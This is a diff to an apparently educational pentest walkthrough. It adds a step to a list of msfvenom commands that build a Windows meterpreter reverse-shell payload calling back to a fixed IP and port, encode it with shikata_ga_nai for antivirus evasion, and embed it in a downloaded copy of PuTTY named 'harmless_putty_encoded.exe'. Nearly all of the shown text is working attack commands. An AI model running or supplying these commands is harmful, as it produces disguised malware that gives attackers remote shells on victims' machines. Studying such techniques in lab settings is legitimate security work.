@@ -46,6 +46,8 @@ HTTPort is a tool that bypasses restrictive HTTP proxies. It tunnels blocked tra
 **Steps**:
 You generated a basic, easily detectable payload:
 - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.111.208 LPORT=4444 -f exe -o payload.exe`
+Generate a New, Encoded Payload:
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.111.208 LPORT=4444 -x template.exe -k -e x86/shikata_ga_nai -f exe -i 5 -o harmless_putty_encoded.exe`
 You downloaded putty.exe to use as a legitimate template:
 - `wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O template.exe`
 You injected your payload into that template to create a more evasive executable:
